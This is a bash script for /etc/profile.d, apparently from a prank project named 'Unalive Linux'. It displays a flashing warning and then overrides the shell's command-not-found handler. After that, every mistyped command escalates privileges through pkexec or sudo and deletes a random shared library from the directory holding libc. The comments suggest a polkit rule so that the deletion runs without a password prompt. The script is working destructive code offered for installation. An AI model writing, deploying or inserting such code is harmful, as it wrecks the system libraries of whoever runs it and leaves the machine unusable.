# This script is intended to be installed in '/etc/profile.d/'.
# It is not intended to be run directly/interactively.
# Hence why there is no shebang and the script does not have 755 mode.

# Display the mandatory warning. Make it bold, red and flashing.
echo -e "\e[1;5;31mWARNING: Unalive Linux is active! Good luck...\e[0m" >&2

# Determine the libdir containing 'libc.so.6', from '/etc/ld.so.conf'.
unalive_libdir=""
while IFS= read -r line; do
  # Ignore lines that don't begin with a slash, then check for libc.so.6.
  if echo "$line" | grep -q "^/" && test -x "$line"/libc.so.6; then
    # Set this directory as the one we want and exit the loop.
    unalive_libdir="$line"
    break
  fi
done < /etc/ld.so.conf

# Display a warning if no libdir containing libc.so.6 was found.
if test -z "$unalive_libdir"; then
  echo -e "\e[1;31mERROR: No libdir found - Unalive Linux won't run.\e[0m" >&2
fi

# Provide the command_not_found_handle.
command_not_found_handle() {
  # Display the message.
  echo -e "\e[1;31mUh-oh! You know what's going to happen now...\e[0m" >&2
  # Do nothing if the libdir was not found.
  if test -z "$unalive_libdir"; then
    echo -e "\e[1;31m...nothing at all, since no libdir was found.\e[0m" >&2
    return
  fi
  # See if we can elevate using pkexec (polkit), otherwise use sudo.
  # Note that sudo doesn't have a rule to skip password authentication.
  # If neither was found, don't use anything at all.
  local unalive
  if command -v pkexec &>/dev/null; then
    unalive="pkexec"
  elif command -v sudo &>/dev/null; then
    unalive="sudo"
  else
    unalive=""
  fi
  # Find all libraries in the libdir and randomly choose one to remove.
  # Ideally, the polkit rule should be installed to avoid a password prompt.
  $unalive rm -fv "$(find "$unalive_libdir" -mindepth 1 -maxdepth 1 -type f -name \*.so\* | shuf -n1)"
}
